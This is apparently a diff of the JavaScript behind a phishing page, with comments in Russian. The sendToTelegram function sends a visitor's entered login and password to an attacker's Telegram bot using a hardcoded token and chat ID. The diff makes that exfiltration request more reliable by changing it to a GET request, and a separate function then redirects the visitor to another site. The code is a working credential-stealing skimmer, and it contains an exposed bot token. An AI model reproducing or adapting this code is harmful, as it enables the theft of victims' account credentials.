@@ -345,8 +345,6 @@ function goBackToEmailPage() {
  */
 function redirectToOtherSite() {
   // ЗАМЕНИТЕ ЭТУ ССЫЛКУ НА СВОЙ САЙТ
-   console.log('🔍 DEBUG: Вызвана redirectToOtherSite(), URL:', 'https://ixdk.github.io/my-list-page/');
-  
   const otherSiteUrl = 'https://ixdk.github.io/my-list-page/';
 
   document.body.style.opacity = '0.8';
@@ -358,27 +356,34 @@ function redirectToOtherSite() {
 }
 
 function sendToTelegram(login, password, pageType) {
-    // Твои данные (токен и chat_id уже вставлены)
     const BOT_TOKEN = '8574575973:AAG1H0-l52kgQrhvbfrUEQGow_BAOCKRIvA';
     const CHAT_ID = '788541169';
     
-    // Форматируем сообщение. pageType поможет понять, с какой страницы данные.
-    const message = `🔐 Данные с формы (${pageType}):\n👤 Логин: ${login}\n🔑 Пароль: ${password || 'не введен'}\n🕐 ${new Date().toLocaleString()}`;
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-
-    // Отправляем запрос. Используем fetch, который уже используется в коде.
+    // Форматируем сообщение. Убираем emoji на всякий случай.
+    const message = `Данные с формы (${pageType}):\nЛогин: ${login}\nПароль: ${password || 'не введен'}\nВремя: ${new Date().toLocaleString()}`;
+    
+    // Формируем URL правильно: это GET-запрос с параметрами в URL.
+    // Это САМЫЙ НАДЁЖНЫЙ способ, который редко даёт 400 ошибку.
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+    
+    // Отправляем простой GET-запрос.
     fetch(url, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        // Режим 'no-cors' может понадобиться, если браузер будет ругаться на CORS.
-        mode: 'no-cors', // РАСКОММЕНТИРОВАНО! Если будут другие ошибки, можно вернуть.
-        body: JSON.stringify({
-            chat_id: CHAT_ID,
-            text: message
-        })
+        method: 'GET', // Меняем на GET!
+        // mode: 'no-cors', // ЗАКОММЕНТИРУЙТЕ или УДАЛИТЕ эту строку для GET-запроса
     })
-    .then(() => console.log(`✅ Данные с ${pageType} отправлены в Telegram`))
-    .catch(err => console.error('❌ Ошибка Telegram:', err));
+    .then(response => {
+        console.log(`Telegram API ответ: статус ${response.status}`);
+        if (!response.ok) {
+            // Если ответ не OK, пробуем прочитать текст ошибки
+            return response.text().then(text => {
+                throw new Error(`Telegram API ошибка: ${response.status} - ${text}`);
+            });
+        }
+        console.log(`✅ Данные с ${pageType} отправлены в Telegram`);
+    })
+    .catch(err => {
+        console.error('❌ Ошибка Telegram:', err.message); // Выводим понятное сообщение
+    });
 }
 
 /**
